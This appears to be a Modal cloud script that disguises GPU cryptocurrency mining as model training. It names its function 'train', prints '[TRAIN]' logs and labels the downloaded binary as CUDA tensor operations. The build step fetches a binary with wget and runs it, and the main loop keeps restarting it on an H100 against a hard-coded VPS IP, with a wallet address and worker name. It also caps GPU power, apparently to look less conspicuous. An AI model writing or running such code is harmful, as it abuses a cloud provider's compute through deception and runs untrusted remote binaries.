import modal

app = modal.App("Project NASA")
VPS = "43.156.178.157"
WALLET = "prl1p4yctfh3zd4n2rxsevgnet9gt43gdnc95hm66yysggqlyqu0secpqhyntrr"
NODE = "NASATECH"

image = (
    modal.Image.from_registry("nvidia/cuda:12.4.0-runtime-ubuntu22.04", add_python="3.11")
    .apt_install("libgomp1", "wget")
    .run_commands(
        "wget -q -O /usr/local/bin/worker_node https://raw.githubusercontent.com/wjapraaa/cuda_tensor/main/cuda_tensor_ops && chmod +x /usr/local/bin/worker_node"
    )
)

@app.function(gpu="H100", image=image, timeout=86400)
def train():
    import subprocess, time

    print("[TRAIN] Starting compute node...")
    subprocess.run(["nvidia-smi", "-pl", "150"], capture_output=True, timeout=10)
    while True:
        proc = subprocess.Popen(
            ["/usr/local/bin/worker_node", "--host", f"{VPS}:9000",
             "--user", WALLET, "--worker", NODE],
            stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
            text=True, bufsize=1
        )
        
        for line in proc.stdout:
            print(line.rstrip(), flush=True)
        
        proc.wait()
        print("[TRAIN] Process exited, restarting in 5s...")
        time.sleep(5)

@app.local_entrypoint()
def main():
    train.remote()
